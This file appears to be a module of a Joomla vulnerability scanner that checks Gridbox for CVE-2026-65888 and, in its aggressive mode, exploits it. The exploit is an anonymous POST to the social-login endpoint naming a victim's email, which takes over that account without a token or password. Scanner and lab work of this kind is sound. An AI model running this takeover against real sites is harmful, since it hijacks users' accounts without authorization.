from __future__ import annotations

from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from . import gridbox_common as gb

CVE_ID = "CVE-2026-65888"
NAME = "Gridbox social login trusts a request-supplied email"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.1"
FIXED_RULE = "Gridbox 2.20.2 or later"
SOCIAL_PATH = "/index.php?option=com_gridbox&task=account.socialLogin"


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    victim_email: str | None = None,
    victim_user: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    if not victim_email:
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=False,
            proof_url=f"{base}{SOCIAL_PATH}",
            detail="The probe needs the target account email via --aggressive-arg victim_email=...; nothing was sent.",
            action="Re-run with a lab account email on an authorized target.",
        )
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    response = client.request(
        f"{base}{SOCIAL_PATH}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({
            "name": "Gridbox Lab Social",
            "email": victim_email,
            "avatar": "https://example.test/avatar.png",
            "id": "1",
        }),
        timeout=timeout,
        follow_redirects=False,
    )
    body = gb.json_body(response)
    identity = gb.profile_identity(client, base, timeout)
    evidence: dict[str, object] = {
        "email": victim_email,
        "social_status": response.get("status"),
        "social_accepted": body.get("status") is True,
        "authenticated_identity": identity,
    }
    matched = identity is not None and (victim_user is None or identity == victim_user)
    if body.get("status") is True and matched:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{SOCIAL_PATH}",
            evidence=evidence,
            detail=(
                f"An anonymous POST naming {victim_email} minted a session as {identity} without any "
                "provider token, signature or password. The profile edit form returned that identity."
            ),
            action=(
                "Upgrade Gridbox to 2.20.2 or later, which only accepts provider-verified payloads; "
                "review sessions and recent logins for unauthorized access."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{SOCIAL_PATH}",
        evidence=evidence,
        detail=(
            "The social login request did not yield the requested account "
            f"(accepted={body.get('status') is True}, identity={identity!r})."
        ),
        action="Verify Gridbox runs 2.20.2 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = gb.passive_gridbox(
        plugins,
        cve=CVE_ID, name=NAME, component=COMPONENT, affected_rule=AFFECTED_RULE,
        fixed_rule=FIXED_RULE, fixed="2.20.2",
        affected_detail="Gridbox is in the affected range; verify that account.socialLogin accepts an arbitrary email.",
        patched_detail="Gridbox only accepts provider-verified social payloads.",
        action="Upgrade Gridbox to 2.20.2 or later and audit sessions and logins.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only social-login proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    args = aggressive_args or {}
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        victim_email=args.get("victim_email"),
        victim_user=args.get("victim_user"),
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Authentication Bypass",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-65888",
            "https://mysites.guru/blog/gridbox-23-critical-vulnerabilities/",
        ],
    }
